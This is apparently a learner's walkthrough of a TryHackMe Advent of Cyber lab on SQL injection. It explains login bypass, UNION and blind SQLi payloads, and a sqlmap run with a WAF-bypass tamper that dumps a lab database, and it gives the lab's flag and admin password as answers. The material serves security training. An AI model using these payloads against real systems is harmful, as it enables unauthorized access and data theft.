DAY 5 - SOMEONE STOLE SANTA'S GIFT LIST! [WEB EXPLOITATION]
----

# STORY :
----

After last year's attack, Santa and the security team have worked hard on reviving Santa's personal portal. Hence, 'Santa's forum 2' went live.

After the attack, logs have revealed that someone has found Santa's panel on the website and logged into his account! After doing so, they were able to dump the whole gift list database, getting all the 2020 gifts in their hands. An attacker has threatened to publish a wishlist.txt file, containing all information, but happily, for us, he was caught by the CBI (Christmas Bureau of Investigation) before that. On MACHINE_IP:8000 you'll find the copy of the website and your goal is to replicate the attacker's actions by dumping the gift list!

----

# What is SQL Injection?
----

>>A SQL injection (SQLi) attack consists of the injection of a SQL query to the remote web application. 
>>A successful SQL injection exploit can read sensitive data from the database (usernames & passwords), modify database data (Add/Delete), execute administration operations on the database (such as shutdown the database), and in some cases execute commands on the operating system.

----

# SQL Background :
----

>>SQL is a language used in programming to talk to databases. It's an extremely handy language that makes it easy for the developers to organise data in various structures. Unfortunately, the benefit always comes with a drawback; even a little misconfiguration in SQL code can lead to a potential SQL injection.

>>In any case, in the SQL Injection attack, we mainly use only 4 commands: 
"SELECT", "FROM", "WHERE", and "UNION".

SQL Command		Description
SELECT			Used to select data from a database.
FROM			Used to specify which table to select or delete data from.
WHERE			Used to extract only those records that fulfil a specified condition.
UNION			Used to combine the result-set of two or more SELECT statements.

>>It is important to mention that " 1=1 " in SQL stands for " True " (shortly you'll see the reason as to why I mention this).

----

# How does an SQLi attack work?
----

>>SQLi is carried out through abusing a PHP GET parameter (for example ?username=, or ?id=) in the URL of a vulnerable web page, such as those covered in Day 2. 

>>These are usually located in the search fields and login pages, so as a penetration tester, you need to note those down.

>>Here's an example of a username input field written in PHP:

```php
<?php $username = $_GET['username']; $result = mysql_query("SELECT * FROM users WHERE username='$username'"); ?>
```
>>After a variable username was inputted in the code, PHP automatically uses SQL to select all users with the provided username. Exactly this fact can be abused by an attacker.

>>Let's say a malicious user provides a quotation mark (') as the username input. Then the SQL code will look like this:

 SELECT * FROM users WHERE username='''

>>As you can see, that mark creates a third one and generates an error since the username should only be provided with two. Exactly this error is used to exploit the SQL injection.

>>Generally speaking, SQL injection is an attack in which your goal is to break SQL code execution logic, inject your own, and then 'fix' the broken part by adding comments at the end.

```SQL
/sqli-labs/Less-1/index.php?id=1' AND 1=1 --+  
```

>>1' BREAKS THE SQL QUERY , AND 1=1 SQL CODE , --+ FIXING THE QUERY AND MAKING THE SQL CODE PART OF IT.

>>Graphical interpretation

>>Most commonly used comments for SQLi payloads:

```SQL
--+ // /*
```

----

# Login Bypass with SQL Injection :
----

>>One of the most powerful applications of SQL injection is definitely login bypassing. It allows an attacker to get into ANY account as long as they know either username or password to it (most commonly you'll only know username).

>>First, let's find out the reason behind the possibility to do so. Say, our login application uses PHP to check if username and password match the database with following SQL query:

```SQL
SELECT username,password FROM users WHERE username='$username' and password='$password'
```
>>As you see here, the query is using inputted username and password to validate it with the database.

>>What happens if we input [' or true --] username field there? This will turn the above query into this:

```SQL
SELECT username,password FROM users WHERE username='' or true -- and password=''
```

>>The [--] in this case has commented out the password checking part, making the application forget to check if the password was correct. This trick allows you to log in to any account by just putting a username and payload right after it.

>>Note that some websites can use a different SQL query, such as:

```SQL
SELECT username,pass FROM users WHERE username=('$username') and password=('$password')
```
>>In this case, you'll have to add a single bracket to your payload like so:[ ') or true– ] to make it work.

>>You can practice login bypassing on a deployed machine, port 3000 (First browse to MACHINE_IP:3000/init.php and then to MACHINE_IP:3000). I've put an extra interactive exercise there. It'll show you all back end output, allowing you to experiment and practice with SQL commands.

----

# Blind SQL Injection :
----

>>In some cases, developers become smart enough to mitigate SQL Injection by restricting an application from displaying any error. Happily, this does not mean we cannot perform the attack.

>>Blind SQL Injection relies on changes in a web application, during the attack. In other words, an error in SQL query will be noticeable in some other form (i.e changed content or other).

>>Since in this situation we can only see if an error was produced or not, blind SQLi is carried out through asking 'Yes' or 'No' questions to the database (Error = 'No', No Error = 'Yes').

>>Through that system, an attacker can guess the database name, read columns and etc. Blind SQLi will take more time than other types but can be the most common one in the wild.

>>Start off with finding a way to cause the SQL error and then fixing it back.
https://i.imgur.com/CxxUthP.png

>>Breaking the application
https://i.imgur.com/mpYUwOS.png

>>Fixing it - Notice how the app did not output any error, even though I've clearly caused an SQL error.

>>For asking the questions, you can use [ SUBSTR() ] SQL function. It extracts a substring from a string and allows us to compare the substring to a custom ASCII character.
```bash
substr((select database()),1,1)) = 115
```

>>The above code is asking the database if its name's first letter is equal to 155 ('s' in ASCII table).

Now put this into a payload:
```bash
?id=1' AND (ascii(substr((select database()),1,1))) = 115 --+
```

>>The payload is the question. If the application does not produce any changes, then the answer is 'Yes' (the database's first letter is 's'). Any error or change = 'No'.
https://i.imgur.com/f1C2aWx.png

Note: You can use blind SQLi injection techniques in the 'open' situation too.

----

# UNION SQL Injection
----

>>UNION SQLi is mainly used for fast database enumeration, as the UNION operator allows you to combine results of multiple SELECT statements at a time.

>>UNION SQLi attack consists of 3 stages:
 1. Finding the number of columns
 2. Checking if the columns are suitable
 3. Attack and get some interesting data.

 >>Determining the number of columns required in an SQL injection UNION attack
>>There are exactly two ways to detect one:

>>The first one involves injecting a series of ORDER BY queries until an error occurs. For example:

' ORDER BY 1-- ' ORDER BY 2-- ' ORDER BY 3-- # and so on until an error occurs
(The last value before the error would indicate the number of columns.)

>>The second one (most common and effective), would involve submitting a series of UNION SELECT payloads with a number of NULL values:

' UNION SELECT NULL-- ' UNION SELECT NULL,NULL-- ' UNION SELECT NULL,NULL,NULL-- # until the error occurs
No error = number of NULL matches the number of columns.

  * Finding columns with a useful data type in an SQL injection UNION attack

>>Generally, the interesting data that you want to retrieve will be in string form. Having already determined the number of required columns, (for example 4) you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In case of 4 you would submit:

' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--
No error = data type is useful for us (string).

>>Using an SQL injection UNION attack to retrieve interesting data
When you have determined the number of columns and found which columns can hold string data, you can finally start retrieving interesting data.

>>Suppose that:

 * The first two steps showed exactly two existing columns with useful datatype.
 * The database contains a table called users with the columns username and password.

>> In this situation, you can retrieve the contents of the user's table by submitting the input:

' UNION SELECT username, password FROM users --

>>Here's a small list of thing you'd want to retrieve:

1. database()
2. user()
3. @@version
4. username
5. password
6. table_name
7. column_name

----

# SQLMap
>>SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It's an incredible tool that can be learned within minutes. It's already included in THM's AttackBox or you can install it locally by running:

git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev
Here are some of the most common options that you would configure when using SQLMap:

Command	
--url	Provide URL for the attack
--dbms	Tell SQLMap the type of database that is running
--dump	Dump the data within the database that the application uses
--dump-all	Dump the ENTIRE database
--batch	SQLMap will run automatically and won't ask for user input
Let's show an example of an SQLMap command. Let's say we have a vulnerable login form located at "http://tbfc.net/login.php". (Note, this is just an example, please do not SQLMap this website as no consent has been given by the owner.) We would use this alongside --url to tell SQLMap where to attack. i.e. sqlmap --url http://tbfc.net/login.php

Where we can then proceed to enumerate what data is in the application's database with options such as --tables and --columns. Leaving our final SQLMap looking like so: sqlmap --url http://tbfc.net/login.php --tables --columns

Again, tbfc.net is given as an example, please do not perform any attack on this site.

You can find a cheatsheet for more snippets of SQLMap commands here

# SQLMap & BurpSuite :
----

>The most beneficial feature of sqlmap is its integration with BurpSuite.

With BurpSuite, you can capture and save login or search information to use with SQLMap. This is done by intercepting a request. You will need to configure your browser to use BurpSuite as a proxy for this request to capture. The AttackBox has made this simple for you by using the FoxyProxy extension in Firefox.

First let's startup BurpSuite located in "Applications -> Web -> BurpSuite Community Edition" on the AttackBox
Use Firefox to visit the application we suspect to be vulnerable
Enable FoxyProxy in Firefox:

Submit a request on the web application we suspect to be vulnerable
Send the request from the "Proxy" tab to the repeater by right-clicking and pressing "Send to Repeater"
Notice our request is now in the "Repeater" tab:

Finally, save this request by right-clicking and pressing "Save item"

We can then use this request in SQLMap:

sqlmap -r filename
SQLMap will automatically translate the request and exploit the database for you.

# Challenge :
----
Visit the vulnerable application in Firefox, find Santa's secret login panel and bypass the login. Use some of the commands and tools covered throughout today's task to answer Questions #3 to #6.

Santa reads some documentation that he wrote when setting up the application, it reads:

Santa's TODO: Look at alternative database systems that are better than sqlite. Also, don't forget that you installed a Web Application Firewall (WAF) after last year's attack. In case you've forgotten the command, you can tell SQLMap to try and bypass the WAF by using 

----

# MY DOCUMENTATION:

>>OPEN THE GIVEN-IP IN THE BROWSER AND SEARCH IT WITH PORT NUMBER 8000. 

1.Santa's Official Forum V2 Santa's forum is back!
  * Welcome, stranger! This is a place to exchange your Christmas stories and wishes.
>>TO GO TO THE LOGINPAGE NAVIGATE TO "http://GIVEN-IP:8000/santapanel" . 

2.LOGIN PAGE DISPLAY "USERNAME" AND "PASSWORD"
>>TO LOGIN THERE IS A SQL INJECTION.SO GIVE ANY USERNAME 
username : "prathap"  
password : ' or true --
>>THIS IS THE ARE WE INJECT TO BYPASS THE LOGIN AREA. 

```SQL           
' or true --
```

3.The database has been updated while you were away!
>>AFTER WE BYPASS THE LOGIN AREA IT DISPLAYS THE ABOVE MESSAGE AND A ENTER [SEARCH BOX] AND BELOW THAT IT DISPLAYS 
Gift  Child
N
U
L
L
>>TO GET THE INFO IN THIS AREA.THERE IS INJECTABLE AREA IN THIS ENTER SEARCH BOX 
ENTER : ' ORDER BY 1--

```SQL
'ORDER BY 1--
```
>>NOW WE GET THIS INFO IN THE SAME PAGE

Gift 	                       Child
10 McDonalds meals 	        Thomas
TryHackMe Sub 	            Kenneth
air hockey table 	          Christopher
bike 	                      Matthew
books 	                    Richard
candy 	                    David
chair 	                    Joshua
fazer chocolate 	          Donald
finnish-english dictionary 	James
github ownership 	          Paul
iphone 	                    Robert
laptop 	                    Steven
lego star wars 	            Daniel
playstation 	              Michael
rasberry pie 	              Andrew
shoes 	                    James
skateboard 	                John
socks 	                    Joseph
table tennis 	              Anthony
toy car 	                  Charles
wii 	                      Mark
xbox 	                      William

>>NOW WE "flag" AND "admin" PASSWORD.
>>SO INTERCEPT THE DATABASE AREA WITH BURPSUITE AND SEND IT TO REPEATER AND SAVE THE ITEM.
>>INTERCEPTED TRAFFIC SAVED AS "panel.txt" 
>>THIS IS THE SAVED FORMAT

```bash
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, exten$
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2021.8.2" exportTime="Fri Oct 29 07:28:54 BST 20$
  <item>
    <time>Thu Jan 01 01:00:00 GMT 1970</time>
    <url><![CDATA[http://10.10.101.106:8000/santapanel?search=pratha$
    <host ip="">10.10.101.106</host>
    <port>8000</port>
    <protocol>http</protocol>
    <method><![CDATA[GET]]></method>
    <path><![CDATA[/santapanel?search=prathap]]></path>
    <extension>null</extension>
    <request base64="true"><![CDATA[R0VUIC9zYW50YXBhbmVsP3NlYXJjaD1w$
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>
```

>>NOW WE NEED TO USE "sqlmap" TOOL TO DETECT AND EXPLOIT THE SQL INJECTION FLAWS.

>>USE THIS TOOL WITH THE SAVED ITEM AND TRYING AND BYPASS THE WAF BY USING "--tamper=space2comment"SPECIFYING THE DATABASE NAME "sqlite" AND DUMPING THE DATABASE.  

```bash
sqlmap -r panel.request --tamper=space2comment --dbms sqlite --dump-all
```

```bash
root@ip-10-10-124-175:~/Desktop# sqlmap -r panel.request --tamper=space2comment --dbms sqlite --dump-all
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.4#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 07:37:33

[07:37:33] [INFO] parsing HTTP request from 'panel.request'
[07:37:33] [INFO] loading tamper script 'space2comment'
[07:37:33] [INFO] testing connection to the target URL
[07:37:33] [INFO] testing if the target URL content is stable
[07:37:34] [INFO] target URL content is stable
[07:37:34] [INFO] testing if GET parameter 'search' is dynamic
[07:37:34] [WARNING] GET parameter 'search' does not appear to be dynamic
[07:37:34] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[07:37:34] [INFO] testing for SQL injection on GET parameter 'search'
[07:37:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[07:37:34] [WARNING] reflective value(s) found and filtering out
[07:37:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[07:37:35] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[07:37:35] [INFO] target URL appears to have 2 columns in query
[07:37:35] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[07:37:35] [INFO] checking if the injection point on GET parameter 'search' is a false positive
[07:37:35] [INFO] heuristics detected web page charset 'ascii'
[07:37:35] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: search=prathap' UNION ALL SELECT NULL,'qkqkq'||'dvCVwLqHtGZsHExHmzhLgpCQbEzxjpwCNlGYUFGe'||'qpxqq'-- btVc
---
[07:38:30] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[07:38:30] [INFO] testing SQLite
[07:38:30] [INFO] confirming SQLite
[07:38:30] [INFO] actively fingerprinting SQLite
[07:38:31] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[07:38:31] [INFO] sqlmap will dump entries of all tables from all databases now
[07:38:31] [INFO] fetching tables for database: 'SQLite_masterdb'
[07:38:31] [INFO] fetching columns for table 'sequels' in database 'SQLite_masterdb'
[07:38:31] [INFO] fetching entries for table 'sequels' in database 'SQLite_masterdb'
Database: SQLite_masterdb
Table: sequels
[22 entries]
+-------------+-----+----------------------------+
| kid         | age | title                      |
+-------------+-----+----------------------------+
| James       | 8   | shoes                      |
| John        | 4   | skateboard                 |
| Robert      | 17  | iphone                     |
| Michael     | 5   | playstation                |
| William     | 6   | xbox                       |
| David       | 6   | candy                      |
| Richard     | 9   | books                      |
| Joseph      | 7   | socks                      |
| Thomas      | 10  | 10 McDonalds meals         |
| Charles     | 3   | toy car                    |
| Christopher | 8   | air hockey table           |
| Daniel      | 12  | lego star wars             |
| Matthew     | 15  | bike                       |
| Anthony     | 3   | table tennis               |
| Donald      | 4   | fazer chocolate            |
| Mark        | 17  | wii                        |
| Paul        | 9   | github ownership           |
| James       | 8   | finnish-english dictionary |
| Steven      | 11  | laptop                     |
| Andrew      | 16  | rasberry pie               |
| Kenneth     | 19  | TryHackMe Sub              |
| Joshua      | 12  | chair                      |
+-------------+-----+----------------------------+

[07:38:31] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/root/.sqlmap/output/10.10.101.106/dump/SQLite_masterdb/sequels.csv'
[07:38:31] [INFO] fetching columns for table 'hidden_table' in database 'SQLite_masterdb'
[07:38:31] [INFO] fetching entries for table 'hidden_table' in database 'SQLite_masterdb'
Database: SQLite_masterdb
Table: hidden_table
[1 entry]
+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| thmfox{All_I_Want_for_Christmas_Is_You} |
+-----------------------------------------+

[07:38:31] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/root/.sqlmap/output/10.10.101.106/dump/SQLite_masterdb/hidden_table.csv'
[07:38:31] [INFO] fetching columns for table 'users' in database 'SQLite_masterdb'
[07:38:31] [INFO] fetching entries for table 'users' in database 'SQLite_masterdb'
Database: SQLite_masterdb
Table: users
[1 entry]
+----------+------------------+
| username | password         |
+----------+------------------+
| admin    | EhCNSWzzFP6sc7gB |
+----------+------------------+

[07:38:31] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/root/.sqlmap/output/10.10.101.106/dump/SQLite_masterdb/users.csv'
[07:38:31] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 1 times
[07:38:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/10.10.101.106'

[*] shutting down at 07:38:31

```

----

# ANSWER THE FOLLOWING :
----

1.Without using directory brute forcing, what's Santa's secret login panel?
>>/santapanel

2.Visit Santa's secret login panel and bypass the login using SQLi
>>No answer needed

3.How many entries are there in the gift database?
>>22

4.What did Paul ask for?
>>Github Ownership

5.What is the flag?
>>thmfox{All_I_Want_for_Christmas_Is_You} 

6.What is admin's password?
>>EhCNSWzzFP6sc7gB

----